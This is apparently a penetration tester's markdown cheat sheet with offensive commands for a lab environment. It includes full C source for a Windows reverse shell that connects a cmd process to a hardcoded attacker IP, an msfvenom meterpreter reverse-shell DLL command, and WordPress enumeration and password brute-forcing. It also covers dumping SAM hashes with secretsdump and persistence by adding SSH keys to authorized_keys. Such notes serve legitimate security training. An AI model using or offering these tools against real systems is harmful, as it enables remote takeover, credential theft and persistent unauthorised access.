Folder: `host1`,`host2` ...
## Wordpress
Scan:
```bash
wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```
[wordpress-shell](https://github.com/leonjza/wordpress-shell)
## Git
```bash
git status
git log
```
get the git id then 
```bash
git show [id]
```

## Compile reverseshell (windows, exe)
```c
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
#define CLIENT_IP (char*)"192.168.45.208"
#define CLIENT_PORT (int)5555
#endif
/* ================================================== */

int main(void) {
	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
		return (1);
	}

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}
#endif

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}
```
to compile:
```bash
i686-w64-mingw32-gcc-win32 -std=c99 windows.c -o rsh.exe -lws2_32
```
## reverseshell (dll)
x64:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST=192.168.45.200 LPORT=443 > reverse.dll
```
## Grant privilege of folder to user
```powershell
icacls "C:\Staging" /grant adrian:(OI)(CI)F /T
```

## Wordpress
Wpscan: `-e at -e ap -e u`
```bash
wpscan --url http://intranet.relia.com --enumerate p --plugins-detection aggressive
```
Brute force:
```bash
wpscan --url http://test.local/ --passwords passwords.txt
```
## Monitor process , Linux
Use [pspy64](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1)

# extract SAM,SYSTEM file -> secretsdump
Download them under `C:\windows.old\Windows\system32`
Then use secretsdump :
```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```

# Genrate ssh key pair
```bash
ssh-keygen -t rsa -b 4096
ssh-keygen -t dsa 
ssh-keygen -t ecdsa -b 521
ssh-keygen -t ed25519
```
Then add public key -> authorized_keys under `.ssh`
